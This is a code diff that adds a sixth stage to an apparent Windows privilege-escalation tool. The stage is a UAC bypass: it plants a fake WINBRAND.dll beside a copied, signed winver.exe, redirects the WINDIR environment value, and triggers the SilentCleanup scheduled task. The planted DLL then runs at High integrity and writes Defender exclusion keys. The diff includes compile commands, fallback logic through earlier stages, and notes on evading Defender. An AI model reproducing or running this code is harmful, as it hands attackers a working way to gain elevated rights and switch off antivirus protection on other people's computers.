@@ -11,12 +11,21 @@
       5. SilentCleanup + COM handler hijack -- real signed cleanmgr.exe loads our DLL
          via HKCU\Software\Classes\CLSID shadow; no UAC at any level
          Requires: stage5.dll (compile stage_dll.cpp first)
+         NOTE: fails on Win11 -- cleanmgr.exe no longer calls CoCreateInstance on
+         VolumeCaches handlers (disk cleanup moved to Settings in Win11)
+      6. SilentCleanup + DLL import hijack (winver.exe as cleanmgr.exe + fake WINBRAND.dll)
+         winver.exe statically imports WINBRAND.dll (not a KnownDLL).
+         PE loader resolves imports from the application directory first, finds our
+         fake WINBRAND.dll, calls DllMain -- payload runs at High integrity BEFORE
+         winver.exe's WinMain even begins.  No COM, no unsigned EXE, purely DLL load.
+         Requires: winbrand.dll (compile winbrand_proxy.cpp first)
 
     Phase 2 entry: token_steal.exe /elevated
       -> Writes directly to HKLM Defender exclusion registry keys
 
     Compile:
       cl.exe stage_dll.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:stage5.dll
+      cl.exe winbrand_proxy.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:winbrand.dll
       cl.exe stage2.cpp /O2 /GS- /link advapi32.lib kernel32.lib /subsystem:windows /entry:mainCRTStartup /out:stage2.exe
       cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib oleaut32.lib user32.lib wbemuuid.lib /out:token_steal.exe
 */
@@ -644,6 +653,161 @@ cleanup_hkcu:
     return false;
 }
 
+// ─── Stage 6: SilentCleanup + DLL import hijack (winver.exe + WINBRAND.dll) ──
+//
+// Why cleanmgr.exe's COM handler path (Stage 5) stopped working on Windows 11:
+//   Microsoft migrated Disk Cleanup to Settings > Temporary files in Win11.
+//   cleanmgr.exe still exists but no longer enumerates VolumeCaches COM handlers
+//   when run silently (/autoclean).  CoCreateInstance is never called.
+//
+// Stage 6 takes a completely different approach -- DLL import hijacking:
+//   - Instead of cleanmgr.exe, we copy WINVER.EXE (signed Microsoft binary) as
+//     C:\exclusiontest\system32\cleanmgr.exe.
+//   - winver.exe STATICALLY imports WINBRAND.dll (the Windows branding helper).
+//     WINBRAND.dll is NOT in HKLM\...\KnownDLLs, so the PE loader searches
+//     the application directory FIRST.
+//   - We plant our fake winbrand.dll (compiled from winbrand_proxy.cpp) in
+//     C:\exclusiontest\system32\ alongside winver.exe.
+//   - When SilentCleanup fires, winver.exe runs elevated, the loader finds
+//     our winbrand.dll in the app directory, calls DllMain -- payload runs at
+//     High integrity BEFORE WinMain ever executes.
+//   - DllMain runs the registry write synchronously, then calls
+//     TerminateProcess(GetCurrentProcess(), 0) so no "About Windows" dialog appears.
+//
+// Requires: winbrand.dll next to token_steal.exe
+//   cl.exe winbrand_proxy.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:winbrand.dll
+
+bool TryWinverDLLHijack(const char* myExePathA) {
+    INFO("=== Stage 6: SilentCleanup + winver.exe DLL import hijack ===");
+
+    // --- Locate winbrand.dll (our payload DLL) ---
+    char dllSrc[MAX_PATH] = {};
+    strncpy(dllSrc, myExePathA, MAX_PATH - 1);
+    char* slDll = strrchr(dllSrc, '\\');
+    if (slDll) strcpy(slDll + 1, "winbrand.dll"); else strcpy(dllSrc, "winbrand.dll");
+    if (GetFileAttributesA(dllSrc) == INVALID_FILE_ATTRIBUTES) {
+        ERR("winbrand.dll not found at %s", dllSrc);
+        ERR("  Compile: cl.exe winbrand_proxy.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:winbrand.dll");
+        return false;
+    }
+    INFO("Payload DLL: %s", dllSrc);
+
+    // --- Locate winver.exe in System32 ---
+    char sys32[MAX_PATH] = {};
+    GetSystemDirectoryA(sys32, MAX_PATH);   // C:\Windows\System32
+
+    char winverSrc[MAX_PATH] = {};
+    lstrcatA(winverSrc, sys32); lstrcatA(winverSrc, "\\winver.exe");
+    if (GetFileAttributesA(winverSrc) == INVALID_FILE_ATTRIBUTES) {
+        ERR("winver.exe not found at %s", winverSrc);
+        return false;
+    }
+
+    // --- Set up fake system32 dir ---
+    static const char kFakeDir[] = "C:\\exclusiontest\\system32";
+    CreateDirectoryA(kFakeDir, nullptr);
+
+    char fakeCleanmgr[MAX_PATH] = {};
+    lstrcatA(fakeCleanmgr, kFakeDir); lstrcatA(fakeCleanmgr, "\\cleanmgr.exe");
+
+    char fakeBrand[MAX_PATH] = {};
+    lstrcatA(fakeBrand, kFakeDir); lstrcatA(fakeBrand, "\\WINBRAND.dll");
+
+    // Copy winver.exe as cleanmgr.exe (signed binary -- Defender won't block it)
+    if (!CopyFileA(winverSrc, fakeCleanmgr, FALSE)) {
+        ERR("CopyFile winver.exe -> cleanmgr.exe failed: %lu", GetLastError());
+        goto cleanup;
+    }
+    OK("Copied winver.exe -> %s (signed binary)", fakeCleanmgr);
+
+    // Plant our fake WINBRAND.dll alongside winver.exe
+    if (!CopyFileA(dllSrc, fakeBrand, FALSE)) {
+        ERR("CopyFile winbrand.dll -> %s failed: %lu", fakeBrand, GetLastError());
+        DeleteFileA(fakeCleanmgr);
+        goto cleanup;
+    }
+    OK("Planted fake WINBRAND.dll -> %s", fakeBrand);
+
+    // --- WINDIR hijack ---
+    {
+        HKEY hEnv = nullptr;
+        RegCreateKeyExA(HKEY_CURRENT_USER, "Environment", 0, nullptr, 0,
+                        KEY_SET_VALUE, nullptr, &hEnv, nullptr);
+        char fakeWin[] = "C:\\exclusiontest";
+        RegSetValueExA(hEnv, "WINDIR", 0, REG_SZ,
+                       (BYTE*)fakeWin, (DWORD)sizeof(fakeWin));
+        RegCloseKey(hEnv);
+        OK("HKCU\\Environment\\WINDIR = C:\\exclusiontest");
+    }
+
+    // Broadcast env change
+    {
+        DWORD_PTR r2 = 0;
+        SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+                            (LPARAM)"Environment", SMTO_ABORTIFHUNG, 1000, &r2);
+    }
+
+    // Delete stale result file
+    DeleteFileA("C:\\exclusiontest\\exclusion_result.txt");
+
+    // Trigger SilentCleanup
+    INFO("Triggering SilentCleanup task (winver.exe as cleanmgr.exe)...");
+    {
+        DWORD ret = (DWORD)system(
+            "schtasks /run /tn "
+            "\"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" >nul 2>&1");
+        DBG("schtasks /run returned: %lu", ret);
+    }
+
+    // DllMain runs synchronously and calls TerminateProcess -- 5s is plenty
+    INFO("Waiting 5s for winver.exe to load our WINBRAND.dll...");
+    Sleep(5000);
+
+    // Restore WINDIR
+    {
+        HKEY hEnv = nullptr;
+        RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hEnv);
+        if (hEnv) { RegDeleteValueA(hEnv, "WINDIR"); RegCloseKey(hEnv); }
+        DWORD_PTR r2 = 0;
+        SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+                            (LPARAM)"Environment", SMTO_ABORTIFHUNG, 1000, &r2);
+        DBG("WINDIR restored");
+    }
+
+    // Check result
+    {
+        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
+        if (f) {
+            char buf[256] = {}; fgets(buf, sizeof(buf), f); fclose(f);
+            buf[strcspn(buf, "\r\n")] = 0;
+            OK("Stage 6 result: %s", buf);
+            if (strncmp(buf, "ok", 2) == 0) {
+                OK("SUCCESS via winver.exe DLL import hijack!");
+                DeleteFileA(fakeCleanmgr);
+                DeleteFileA(fakeBrand);
+                RemoveDirectoryA(kFakeDir);
+                return true;
+            }
+            WARN("DLL ran but reported: %s", buf);
+            // "FAIL-wb-medium" means winver.exe ran but didn't get elevated token
+            // "FAIL-wb-regopen" means HKLM write was denied even at High integrity
+        } else {
+            WARN("No result file -- WINBRAND.dll was not loaded");
+            WARN("Possible causes:");
+            WARN("  (a) WINBRAND.dll is in KnownDLLs on this build (unlikely but check:");
+            WARN("      reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs\" /v WINBRAND)");
+            WARN("  (b) winver.exe imports WINBRAND.dll by ordinal from System32 directly");
+            WARN("  (c) Defender blocked unsigned DLL load into signed winver.exe process");
+        }
+    }
+
+cleanup:
+    DeleteFileA(fakeCleanmgr);
+    DeleteFileA(fakeBrand);
+    RemoveDirectoryA(kFakeDir);
+    return false;
+}
+
 // ─── Stage 4: WMI CommandLineEventConsumer ────────────────────────────────────
 //
 // Creates a WMI permanent subscription in ROOT\subscription.
@@ -930,12 +1094,20 @@ int main(int argc, char* argv[]) {
 
         // Stage 5: SilentCleanup + COM object hijack via HKCU\Software\Classes\CLSID
         // Uses the real signed cleanmgr.exe (Defender doesn't block it).
-        // We register our DLL as a disk-cleanup handler CLSID in HKCU.
-        // cleanmgr.exe CoCreateInstance's that handler at elevated integrity.
-        // Our DllMain runs at High/SYSTEM -- no UAC at any level.
+        // NOTE: on Windows 11 cleanmgr.exe no longer calls CoCreateInstance on
+        // VolumeCaches handlers -- disk cleanup was migrated to Settings in Win11.
         INFO("--- Trying Stage 5: SilentCleanup COM handler hijack ---");
         if (TryCOMHijack(myPath)) goto done;
-        WARN("Stage 5 failed -- all automated stages exhausted");
+        WARN("Stage 5 failed -- trying Stage 6");
+
+        // Stage 6: SilentCleanup + winver.exe (signed) + fake WINBRAND.dll
+        // winver.exe statically imports WINBRAND.dll (not a KnownDLL).
+        // PE loader finds our DLL in the application directory first.
+        // DllMain runs at High integrity before WinMain, writes exclusions, exits.
+        // Requires: winbrand.dll (compile winbrand_proxy.cpp)
+        INFO("--- Trying Stage 6: winver.exe DLL import hijack ---");
+        if (TryWinverDLLHijack(myPath)) goto done;
+        WARN("Stage 6 failed -- all automated stages exhausted");
     }
 
     ERR("All automated elevation stages failed");
